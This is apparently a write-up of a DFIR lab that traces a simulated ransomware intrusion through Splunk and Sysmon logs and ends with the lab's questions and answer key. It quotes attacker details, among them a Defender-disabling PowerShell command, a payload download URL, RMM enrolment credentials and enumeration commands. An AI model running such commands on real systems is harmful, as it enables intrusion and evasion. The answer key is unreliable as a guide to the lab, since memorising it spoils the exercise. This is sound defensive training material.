Scenario

On August 25, 2025, CoreTech’s SOC spotted unusual activity on a workstation, hinting at a breach. Suspicious processes and network activity spread to critical servers, threatening data and systems.

Lab Link.

My Analysis

I will start analyzing the incident, detect the attack activity and after this I will move to the Questions to answer them, but first we need to analyze the incident without reading the questions to improve our skills in detection.

Intial access and Execution

in the first we need to detect how the attacker access the system and what is the activities he took to explore the system, we have a triage images of DESKTOP, File-Server and DC01(Domain Controller) and we have access to SIEM Solution Splunk, I will start by exploring the Log Sources that I have in the SIEM Solution.

Query:
| metadata type=sources

We have windows event logs and the most important source for us is Sysmon, because it contain a lot of useful information about Processes activity, registry activity, files activity and so on

System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log. It provides detailed information about process creations, network connections, and changes to file creation time.

Now I want to see what is the Event IDs that we have in sysmon.

Query:
index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational | stats count by EventCode

Let’s summarize the most important event IDs

Event ID Description
1 proccess Creation
3 Network connection
7 Image loaded
8 CreateRemoteThread
10 ProcessAccess
11 FileCreate
12 RegistryEvent (Object create and delete)
13 RegistryEvent (Value Set)
15 FileCreateStreamHash
17 PipeEvent (Pipe Created)
18 PipeEvent (Pipe Connected)
22 DNSEvent (DNS query)

We Know that the Incident was in 25/8/2025 so we will focus in the events in this day, I always like to start by exploring the files that have been downloaded from the internet.

Query:
index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=15 | table _time host file_path | sort _time

Explanation of the query:
index=*
This tells Splunk to search all indexes.

source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
This filters events coming only from the Sysmon Operational log.

EventCode=15
Sysmon EventCode 15 means “File Created” or “File Stream Created” depending on the Sysmon version.

| table _time host file_path
table selects only specific fields from the results.
Here:
_time → timestamp of the event
host → the machine where the event happened
file_path → the path of the created file

| sort _time
Sorts the results by timestamp in ascending order.

No files were created on that day.
Lets move to see the websites accessed by the users on that day, I will use earliest option to tell splunk that i want to events that created in the starting of day 25 and later

1756080000 convert it to UNIX timestamp -> `

Query:
index=* EventCode=22 earliest=1756080000 | table QueryName, _time | sort _time

scrolling the result we can see that paste.sh accessed on 2025-08-25 13:27:40
paste.sh allows you to paste text, code, or logs and share it via a link, so we need to check it, now i want to find the user that accessed this site, just click on the event and select view event.

the user who made the query was t.leao so I will back to the triage images and go to the browser history for this user.
DESKTOP\uploads\auto\C%3A\Users\t.leon\AppData\Local\Microsoft\Edge\User Data\Default
opening the history file using DB broswer.

ok now we have the link that accessed by the user, lets visit it, and se what is inside it.

wow, this command used powershell to download exe file and store it in the temp, lest complete our analysis and confirm that this was the intial access of the attacker

Query:
index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational Image=*iexploreplugin.exe | stats count by EventCode

this query will help as to see what is the activities of this process.

we have activites related to process creation, file creation, network connection, image loading, registry set values.

after running the executable, it made network connection to two IPs, 10.10.5.62 and 10.10.11.74 with ports 8080, 49668, 135
the most intersting thing that there is 1768 connections made from the executable to 10.10.5.62:8080,it seems to be C2.

now I want to see if this proccess spawned another processes or executed some suspicious commands.

Query:
index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 ParentImage=*iexploreplugin.exe | table _time Image CommandLine ParentImage ParentCommandLine SHA256 |sort _time

wow, We have captured the attacker.

Summary

The attack started on 2025-08-25 at 13:27:40 when the user t.leao interacted with a malicious script hosted on paste.sh. This triggered the download of iexploreplugin.exe, which served as the malware providing the attacker with initial access.

Once executed, the malware connected to the attacker’s C2 server at 10.10.5.62:8080 and ran a series of discovery commands to map the environment.

Discovery

In the previous section, we observed that after establishing C2 communication, the attacker executed several discovery commands to gain a better understanding of the compromised environment. This phase is critical, as it allows the attacker to enumerate system, user, and network information before moving to the next stage of the attack.

Below is a breakdown of the observed discovery activity and its purpose:

  1. cmdkey /list

Binary: C:\Windows\System32\cmdkey.exe
Purpose:
Lists all stored credentials in the Windows Credential Manager.

Why attackers use it:
Identify cached credentials (RDP, SMB, scheduled tasks, services)
Target credentials that can be reused for lateral movement

  1. net view \\coretech.lab\SYSVOL

Binary: C:\Windows\System32\net.exe
Purpose:
Enumerates the SYSVOL share of the domain controller.

Why attackers use it:
Identify domain structure
Locate Group Policy Objects (GPOs)
Search for scripts containing hardcoded credentials

  1. net user /domain

Purpose:
Lists all domain user accounts.

Why attackers use it:
Identify high‑value accounts
Map the domain’s user landscape

  1. net user

Purpose:
Enumerates local user accounts on the compromised system.

Why attackers use it:
Identify local admins or service accounts

  1. net localgroup administrators

Purpose:
Lists all members of the local Administrators group.

Why attackers use it:
Check if the compromised user already has administrative privileges
Identify accounts worth targeting for escalation

  1. whoami

Binary: C:\Windows\System32\whoami.exe
Purpose:
Displays the current user context.

Why attackers use it:
Confirm which account is compromised

  1. ping -n 1 DC01

Binary: C:\Windows\System32\PING.EXE
Purpose:
Checks connectivity to the domain controller (DC01).

Why attackers use it:
Verify domain reachability
Confirm internal network access
Test if lateral movement is possible.

  1. net group "Domain Admins" /domain

Purpose:
Enumerates all members of the Domain Admins group.

Why attackers use it:
Identify top-tier privileged accounts

  1. whoami /all

Purpose:
Displays: User SID, Group memberships, Assigned privileges and tokens

Why attackers use it:
Check for powerful privileges (e.g., SeDebugPrivilege)
Identify misconfigurations

  1. tasklist

Binary: C:\Windows\System32\tasklist.exe
Purpose:
Lists all running processes.

Why attackers use it:
Identify security tools (AV, EDR, logging agents)
Spot high‑value processes (LSASS, browsers)

Summary

The attacker executed a series of built‑in Windows discovery commands to enumerate credentials, user privileges, domain information, and running processes after gaining initial access.

Persistance

The attacker downloaded and setup multiple Remote Management Tools(RMM) on the compromised system between 2025-08-25 13:45:35 and 2025-08-25 14:00:00.

Query:
index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 earliest=1756128800 AND NOT chocolatey| table _time Image CommandLine ParentImage ParentCommandLine host |sort _time

This query will help us to find what commands and processes executed by the attacker after the intial discovery.

Ad to see the Services Installed we need to use Security Event ID 4697.

Query:
index=* EventCode=4697 earliest=1756128800 | table _time, host, service_name | sort _time

  1. First RMM(AteraAgent)
    A legitimate RMM agent used for remote monitoring, system management, and script execution on endpoints. Attackers often abuse it for persistent remote access while blending in with normal IT activity.

this command will download msi file (AteraAgent Installer) and save it as setup.msi, then execute it using msiexec.exe to download AteraAgent Tool with login email bunionsneaker.4m@gmail.com and accountId 001Q300000VzBKuIAN

  1. Second RMM(SplashtopRemoteService)
    Provides remote desktop access for IT support and administration. When misused, it allows attackers to maintain stealthy interactive access without deploying custom malware.

  2. Third RMM(AnyDesk)
    A popular remote access tool that enables full remote control of a system. Threat actors frequently leverage it to gain hands‑on access while bypassing traditional security detections.

After that, while searching through the created files, I found that two files were created under this path C:\Windows\System32\Tasks\ , which means they are scheduled tasks.

scheduled tasks names: AteraAgentServiceWatchdog and Monitoring Recovery, Since these task files are present in the triage image, their configurations can be examined to extract the executed commands and understand how persistence was maintained.

The two scheduled tasks was configured to run the AteraAgent tool.

Summary

Between 13:45 and 14:00, the attacker established persistence by installing multiple RMM tools (AteraAgent, Splashtop, and AnyDesk) to maintain long‑term remote access. Persistence was reinforced through scheduled tasks (AteraAgentServiceWatchdog and Monitoring Recovery) configured to automatically execute the AteraAgent service.

Defense Evasion

During the analysis of commands executed by iexploreplugin.exe, it was observed that the attacker attempted to disable Windows Defender real-time protection as a defense evasion technique.

This command disables real-time monitoring, allowing malicious activity to proceed with reduced detection and increasing the attacker’s ability to maintain access and execute follow-on actions undetected.

Note: In the image we can see that this process executed a vbs script.

I am sure its malicious but I dont know what it is doing so I will back for it later.

Additionally, during the initial access phase, Sysmon Event ID 8 (CreateRemoteThread) revealed that iexploreplugin.exe injected into other running processes. After filtering for this event, it was confirmed that the malware accessed both notepad.exe and spoolsv.exe, indicating process injection.

By migrating into these legitimate processes, the attacker aimed to hide malicious activity, evade detection, and blend in with normal system behavior, a common defense evasion technique, we need to discover why the attacker used these two processes and how (I will cover this later now we need to save the Process IDs for them).

spoolsv proccess ID: 3016
notepad process ID: 14956

Summary

The attacker used multiple defense evasion techniques, including disabling Windows Defender real‑time protection and performing process injection into legitimate processes (notepad.exe and spoolsv.exe) to conceal malicious activity. These actions reduced detection visibility and allowed the malware to blend into normal system behavior while maintaining execution.

Credential Access

Now we know that the attaker Injected two processes notepad.exe and spoolsv.exe, while I am seraching for any Credential access techniques I used this query to find what processes accessed lsass.exe.

Query:
index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=10 TargetImage=*lsass.exe earliest=1756128800 | table _time SourceImage SourceProcessId |sort _time

The attacker targeted the lsass.exe three times, first two attempts was using iexploreplugin.exe and last one was using spoolsv.exe.
last attempt was in 2025-08-25 13:56:54

Summary

The attacker attempted credential access by targeting lsass.exe multiple times, indicating an effort to dump or access stored credentials.

Lateral Movement

Let me ask you a question: Why does the attacker need to extract passwords from lsass.exe?
Of course, it’s to use them to gain higher privileges and expand the scope of their attack to more than one device within the domain,So lets discover if the attacker accessed anothor accounts or machines.

I will use Security Event ID 4624 to find succefull login attempts to FILE-SERVER and DC01.

Query 1:
index=* host="FILES-Server" EventCode=4624 src_ip!="-"| table _time, LogonType, Target_User_Name, src_ip | sort _time

we can easelly confirm that the attacker accessed account admin123 after dumping the hashs from lsass.exe and logon to File-Server using this account.

first logon at 2025-08-25 13:58:52 with LogonType=3 (network logon), TargetUserName=admin143, and IpAddress=10.10.5.62. The source IP 10.10.5.62 matches the attacker’s infrastructure.

Query 2:
index=* host="DC01" EventCode=4624 src_ip!="-" earliest=1756128800 | table _time, LogonType, Target_User_Name, src_ip | sort _time

the attacker logon to the DC with the same username and source IP,first logon was at 2025-08-25 14:34:30

summary

After dumping credentials from lsass.exe, the attacker used the recovered credentials to perform lateral movement by successfully authenticating to both the File Server and the Domain Controller. The successful network logons (Event ID 4624) using the admin143 account from the attacker-controlled IP 10.10.5.62 confirm credential reuse to expand access across the domain.

POST Lateral Movement

At this stage, we focus on the attacker’s activity after gaining access to the File Server and Domain Controller (DC01).

Query:
index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 earliest=1756128800 (host="DC01" OR host="FILES-SERVER" ) AND NOT chocolatey | table _time Image CommandLine ParentImage ParentCommandLine SHA256 host |sort _time

Using Sysmon Event ID 1, we observed that the attacker began enumerating the File Server shortly after successful authentication. Shortly after, PowerShell was used to download a ZIP archive and store it in the Downloads directory.

The attacker then extracted the archive:

lets see what is the files that was in this zip file.

Query:
index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 earliest=1756128800 host="FILES-SERVER" TargetFilename=*Downloads\\python* | table _time TargetFilename |sort _time

Analysis of file creation events showed that python.zip contained two files: testc.exe and python311.dll. After executing testc.exe, two additional files appeared in the Downloads directory, indicating further payload execution.

ok, lets complete our analysis.

Later, at 2025-08-25 14:17:04, the attacker compressed sensitive files into a single archive:

At 2025-08-25 14:25:03, the archive was exfiltrated using the remote synchronization tool rclone, uploading it to a remote storage location named starktech-backups.

all these activites was in the File Server, bSubsequently, the attacker downloaded multiple scripts and modules to DC01 using both PowerShell and certutil:

The attacker then executed dhsf82.bat using PowerShell with execution policy bypass. This script modified registry keys to enable automatic logon, storing the plaintext password CyberNight!128.

then he deleted all shadow copies in the DC01, so i think he is preparing for deploying ransomware or the scripts will be used for encryption purposes

Finally, a text file named Recover-Files.txt was downloaded to the administrator’s desktop. Although the file was not present in the triage image, its naming strongly suggests it was used as a ransomware note, indicating preparation for or execution of an encryption stage.

Summary

After lateral movement, the attacker performed data collection and exfiltration using PowerShell and rclone, targeting sensitive files on the File Server. Activity on DC01 indicates ransomware preparation, including script execution, credential persistence, shadow copy deletion, and the deployment of a ransom note.

Conclusion

This analysis was done before reading the questions, as I focused on investigating the attack end-to-end. While most activity was identified early on, a few important details were discovered later while solving the questions.

The Questions

Intial Access

The intrusion started when the victim accessed a suspicious URL from a file-sharing service. What was the name of the website that triggered the compromise?

Answer: paste.sh

Execution

After visiting the site, the victim ran a PowerShell command via Run. What’s the full URL of the file downloaded and executed?

Answer: http://10.10.5.171:8883/iexploreplugin.exe

A malicious zip file was extracted on the Files Server, yielding two files. What are the names of these extracted files?

Answer: testc.exe,python311.dll

When one file from Q3 was executed, two additional files appeared on the host. What are the names of these dropped files?

Answer: ws2_32.exe,system_module.exe

Command and Control

Network logs reveal an outbound connection from the payload. What’s the attacker’s IP address and port used for the initial C2 communication?

Answer: 10.10.5.62:8080

The attacker connected to a secondary command-and-control server. What’s the domain name of this C2 server?

Query:
index=* host="FILES-Server" EventCode=22 | search Image=*ws2_32.exe* OR Image=*system_module.exe*| table _time, Image, QueryName, answer| sort - _time

Answer: agegamepay.com
the IP for this domain was 10.10.5.245

The ws2_32.exe file was connecting to this C2 after running.

Executing the files from Q4 triggered connections to the attacker’s C2 server. What are the two ports used for these connections?

Query:
index=* host="FILES-Server" EventCode=3 DestinationIp=10.10.5.245| search Image=*ws2_32.exe* OR Image=*system_module* | table _time,Image, SourceIp, DestinationIp, DestinationPort | sort - _time

Answer: 8443,8083

Persistence

During persistence, the attacker leveraged integrator credentials for remote management software. Which credentials were used to link to their account?

Answer: bunionsneaker.4m@gmail.com,001Q300000VzBKuIAN

The attacker installed three remote management services for persistence. What are the names of these services?

Answer: AteraAgent,SplashtopRemoteService,AnyDesk

Installing the remote management tool from Q9 created two scheduled tasks. What are the names of these tasks?

Answer: Monitoring Recovery,AteraAgentServiceWatchdog

During the persistence phase, the attacker created a shortcut to ensure malicious code execution. Which script was responsible for creating this shortcut?

Answer: scvhost.vbs

On the domain server, the attacker configured automatic logon using a user’s credentials. What is the password used, and what is the name of the script responsible for this configuration?

Answer: CyberNight!128,dhsf82.bat

Discovery

During reconnaissance, the attacker enumerated domain accounts. What’s the command used to list all domain users?

Answer: net user /domain

The attacker, during reconnaissance, ran an enumeration tool via C2 after migrating to another process. The tool then generated an output file on the victim host. Which process did they migrate into, and what zip file was created?

Answer: notepad.exe,20250825133552_BloodHound.zip

I missed the file name but we can solve it easily because we know which processes injected, just we want to see file creation activities.

Query:
index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 (ProcessId=3016 OR ProcessId=14956) earliest=1756126833 |table _time TargetFilename| sort _time

Defense Evasion

To evade detection, the attacker disabled a Windows Defender feature. What’s the full command used for this?

Answer: powershell.exe -WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring

Credential Access

The attacker managed to dump hashes on the DESKTOP host. What is the process they migrated to before dumping the hashes?

Answer: spoolsv.exe

Lateral Movement

During lateral movement, the attacker accessed the file server. What’s the username used for this access?

Answer: admin143

Determining the timestamp of lateral movement to the Domain Controller is key for attack analysis. When did the attacker successfully access it?

Answer: 2025-08-25 14:34

Collection

The attacker compressed specific files on the compromised file server for exfiltration. What is the full path to the file where the attacker saved the compressed data?

Answer: C:\ProgramData\Teams\teams-skartech.zip

Exfiltration

The attacker used a tool for syncing files to cloud storage to exfiltrate data from the compromised file server. What is the name of the specific folder or path on the remote storage service used for exfiltration?

Answer: starktech-backups

Impact

The attacker downloaded two scripts to the Domain Controller to attempt file encryption. What are the names of these two scripts?

Answer: crypto.psm1,script.ps1
